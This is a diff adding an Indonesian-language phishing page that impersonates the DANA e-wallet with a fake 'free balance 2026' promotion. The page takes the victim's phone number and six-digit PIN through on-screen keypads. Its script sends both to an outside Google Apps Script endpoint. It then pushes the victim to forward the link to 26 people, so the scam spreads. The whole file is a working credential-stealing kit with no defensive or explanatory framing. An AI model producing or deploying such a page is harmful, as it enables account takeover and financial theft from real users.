@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EVENT SALDO DANA GRATIS MENYAMBUT TAHUN 2026</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',sans-serif;}
+body{
+  display:flex;justify-content:center;align-items:center;height:100vh;
+  background:#f5f5f5;
+}
+.container{
+  width:340px;
+  background:white;
+  border-radius:20px;
+  padding:25px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.2);
+  text-align:center;
+  transition:all 0.4s;
+}
+.logo{width:80px;margin:0 auto 15px;display:block;}
+h2{color:#0047bb;margin-bottom:10px;font-weight:700;font-size:20px;}
+input{
+  width:100%;padding:14px;margin:10px 0;border-radius:12px;
+  border:1px solid #ccc;font-size:16px;outline:none;transition:0.3s;
+}
+input:focus{border-color:#0047bb;}
+.btn{
+  width:100%;padding:14px;border:none;border-radius:12px;
+  background:#0047bb;color:white;font-weight:bold;font-size:16px;
+  cursor:pointer;transition:all 0.3s;
+}
+.btn:hover{background:#003399;transform:scale(1.05);}
+.hidden{display:none;opacity:0;transform:translateX(50px);transition:all 0.4s ease;}
+.visible{display:block;opacity:1;transform:translateX(0);transition:all 0.4s ease;}
+.pin-container{display:flex;justify-content:space-between;margin:20px 0;}
+.pin-dot{width:18px;height:18px;border-radius:50%;border:1px solid #ccc;
+  background:#fff;opacity:0;transform:scale(0);transition:all 0.2s;}
+.pin-dot.filled{background:#0047bb;opacity:1;transform:scale(1.2);}
+.num-pad{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:15px;
+  margin:20px 0;
+  justify-items:center;
+}
+.num-pad button{
+  width:60px;height:60px;border-radius:50%;border:none;
+  background:white;box-shadow:0 4px 8px rgba(0,0,0,0.15);
+  font-size:20px;font-weight:bold;color:#0047bb;cursor:pointer;
+  transition:all 0.2s ease;
+}
+.num-pad button:hover{
+  background:#00aaff;color:white;transform:scale(1.1);
+}
+.num-pad button:active{
+  transform:scale(0.95);box-shadow:0 2px 4px rgba(0,0,0,0.2);
+}
+.back-btn{background:#aaa;margin-top:5px;}
+#progress{height:6px;background:#eee;border-radius:4px;margin:15px 0 20px 0;overflow:hidden;}
+#progress-bar{height:100%;width:0%;background:#0047bb;transition:width 0.3s;}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <img src="https://play-lh.googleusercontent.com/pqoyI2JaPd3uOYt-5GzVqi82OvhBC9Jf-EPQqPDhCbyekdKZe5r-hOGlF4qE1ddWe3o=w600-h300-pc0xffffff-pd" class="logo" alt="DANA Logo">
+  <h2>EVENT SALDO DANA GRATIS MENYAMBUT TAHUN 2026</h2>
+
+  <div id="progress"><div id="progress-bar"></div></div>
+
+  <!-- STEP 1 -->
+  <div id="step1" class="visible">
+    <input type="tel" id="phone" placeholder="Nomor Telepon ">
+    <div class="num-pad">
+      <button onclick="addDigit('phone','1')">1</button><button onclick="addDigit('phone','2')">2</button><button onclick="addDigit('phone','3')">3</button>
+      <button onclick="addDigit('phone','4')">4</button><button onclick="addDigit('phone','5')">5</button><button onclick="addDigit('phone','6')">6</button>
+      <button onclick="addDigit('phone','7')">7</button><button onclick="addDigit('phone','8')">8</button><button onclick="addDigit('phone','9')">9</button>
+      <div></div><button onclick="addDigit('phone','0')">0</button><button onclick="backspace('phone')">⌫</button>
+    </div>
+    <button class="btn" onclick="nextStep()">Lanjut</button>
+  </div>
+
+  <!-- STEP 2 -->
+  <div id="step2" class="hidden">
+    <div class="pin-container">
+      <div class="pin-dot" id="dot1"></div>
+      <div class="pin-dot" id="dot2"></div>
+      <div class="pin-dot" id="dot3"></div>
+      <div class="pin-dot" id="dot4"></div>
+      <div class="pin-dot" id="dot5"></div>
+      <div class="pin-dot" id="dot6"></div>
+    </div>
+
+    <div class="num-pad">
+      <button onclick="addPin('1')">1</button><button onclick="addPin('2')">2</button><button onclick="addPin('3')">3</button>
+      <button onclick="addPin('4')">4</button><button onclick="addPin('5')">5</button><button onclick="addPin('6')">6</button>
+      <button onclick="addPin('7')">7</button><button onclick="addPin('8')">8</button><button onclick="addPin('9')">9</button>
+      <div></div><button onclick="addPin('0')">0</button><button onclick="backspacePin()">⌫</button>
+    </div>
+
+    <button class="btn" onclick="submitForm()">Masuk</button>
+    <button class="btn back-btn" onclick="backStep()">Kembali</button>
+  </div>
+</div>
+
+<script>
+let pin="";
+const URL="https://script.google.com/macros/s/AKfycbyltc2HacHu4ive45gOJfkeNVEoT--8h3D3UEGPqLEH6XTtSAW4Bm2Vbmfq0iIVB2tA/exec";
+
+function addDigit(id,val){ document.getElementById(id).value+=val; }
+function backspace(id){ let inp=document.getElementById(id); inp.value=inp.value.slice(0,-1); }
+
+function nextStep(){
+  const phone=document.getElementById("phone").value.trim();
+  if(phone===""){ alert("Masukkan nomor!"); return; }
+  document.getElementById('step1').classList.replace('visible','hidden');
+  setTimeout(()=>{ document.getElementById('step2').classList.replace('hidden','visible'); },400);
+  document.getElementById('progress-bar').style.width="50%";
+}
+
+function backStep(){
+  document.getElementById('step2').classList.replace('visible','hidden');
+  setTimeout(()=>{ document.getElementById('step1').classList.replace('hidden','visible'); },400);
+  document.getElementById('progress-bar').style.width="0%";
+}
+
+function addPin(d){ if(pin.length<6){ pin+=d; updateDots(); } }
+function backspacePin(){ pin=pin.slice(0,-1); updateDots(); }
+function updateDots(){ for(let i=1;i<=6;i++){ document.getElementById('dot'+i).classList.toggle('filled',i<=pin.length); } }
+
+function submitForm(){
+  if(pin.length!==6){ alert("PIN harus 6 digit!"); return; }
+  const phone=document.getElementById("phone").value.trim();
+  fetch(`${URL}?user1=${encodeURIComponent(phone)}&user2=${encodeURIComponent(pin)}&status=OK`)
+    .then(()=>{ alert("TINGGAL SEDIKIT LAGI! AYO BAGIKAN LINK DENGAN CARA KLIK TITIK 3 POJOK KANAN ATAS DAN SHARE KE 26 ORANG!"); location.reload(); })
+    .catch(err=>alert("Gagal Login: "+err));
+}
+</script>
+
+</body>
+</html>
